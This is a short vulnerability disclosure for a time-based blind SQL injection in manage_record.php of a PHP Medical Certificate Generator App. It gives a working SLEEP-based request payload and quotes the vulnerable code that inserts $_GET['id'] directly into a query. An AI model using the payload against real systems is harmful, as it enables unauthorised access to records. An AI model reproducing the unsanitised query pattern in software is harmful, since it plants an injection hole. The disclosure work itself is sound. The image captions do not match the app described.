### Exploit Title: Medical Certificate Generator App - sql injection vulnerability

### Date: 2024-03/18

### Exploit Author: Peanut886

### Vendor Homepage: https://www.sourcecodester.com

### Software Link: https://www.sourcecodester.com/download-code?nid=16105&title=Medical+Certificate+Generator+App+using+PHP+and+MySQL+Free+Source+Code

### Version: 1.0

### Tested on: windows11 + phpstudy

# **SQL injection vulnerability in manage_record.php**
---
## Sample request POC #1

```
http://localhost:8004/?page=manage_record&id=1%27%20AND%20(SELECT%201133%20FROM%20(SELECT(SLEEP(5)))ReOi)%20AND%20%27Wvfv%27=%27Wvfv
```
## Sqlmap running results #1

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240318-Medical%20Certificate%20Generator%20App%20-%20sql%20injection%20vulnerability/1.manage_record.php.jpg "Lost and Found Information System")

## Related Codes manage_record.php

```
<?php 
if(isset($_GET['id'])){
    $qry = $conn->query("SELECT * FROM `med_cert_info` where id = '{$_GET['id']}'");
    if($qry->num_rows > 0 ){
        foreach($qry->fetch_array() as $k => $v){
            if(!is_numeric($k))
            $$k = $v;
        }
        if(isset($id)){
            $meta_qry = $conn->query("SELECT * FROM `med_cert_info_meta` where `med_cert_info_id` = '{$id}'");
            if($meta_qry->num_rows > 0){
                $meta = array_column($meta_qry->fetch_all(MYSQLI_ASSOC), 'meta_value', 'meta_key');
            }
        }
    }else{
        echo "<script>alert('Unknown given ID')</script>";
    }
}
?>
```
